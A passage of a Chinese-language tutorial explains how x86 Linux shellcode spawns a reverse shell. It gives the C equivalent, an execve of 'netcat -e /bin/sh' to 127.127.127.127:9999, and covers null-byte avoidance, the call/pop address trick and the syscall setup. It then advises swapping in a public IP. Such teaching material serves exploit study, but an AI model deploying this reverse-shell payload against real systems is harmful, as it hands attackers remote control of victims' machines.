其实上面代码想做的翻译成c语言是如下两行

char *command[] = {"/bin/netcat", "-e", "/bin/sh", "127.127.127.127", "9999", NULL};
execve(command[0], command, NULL);
命令就是如下的字符串

/bin/netcat#-e#/bin/sh#127.127.127.127#9999#AAAABBBBCCCCDDDDEEEEFFFF
字符串中各个部分被#隔开，是因为在shellcode中不能出现null，这会造成shellcode被截断，从而不能被
目标主机正确运行。

不管我们在哪里运行这段程序，首先需要知道的是命令字符串的地址。

所以我在第1行和第26行分别创建了两个标签（forword和back），使用call命令时(27行)，首先会把返回地址入栈，返回地址就是下一条指令的地址，而下一条指令的地址恰巧就是我们的命令字符串。

回到第3行，我们把命令字符串地址弹出到ESI寄存器，然后将EAX初始化，注意我们不能直接使用

mov eax,0
因为null在shellcode中是不允许出现的。最后我们吧，命令字符串分开存放到内存之中。

命令字符串分开存放到内存之中

在第5行到第9行，我们把寄存器中的0移动到字符串的末尾，使用替代#（取自eax寄存器，其中的0使用xor生成）之后我们需要一个各个字符串地址的数组，作为execve()的第二个参数。

在第十行，我们把 /bin/netcat 的地址放入 AAAA 所在的位置，程序中的11到18行也是在做同样的事情，最后19行我们把存入到FFFF的位置，作为字符串的结尾。

在第20行我们准备执行系统调用，我们首先把0xb存储到eax中，esi(/bin/netcat的地址)存储到ebx中，字符串的地址存储到，ecx中，最后edx存储null，之后使用0x80触发系统调用，不出意外的话，一个反弹链接的指令就成功执行了。

这个例子中，ip地址使用的是127.127.127.127  端口号是 9999，这是一个本地的ip地址。通常情况下
你需要使用一个外网IP来替换掉它，如果两个ip长度不同的话，你要仔细的修改掉所有与他相关联的汇编代码。
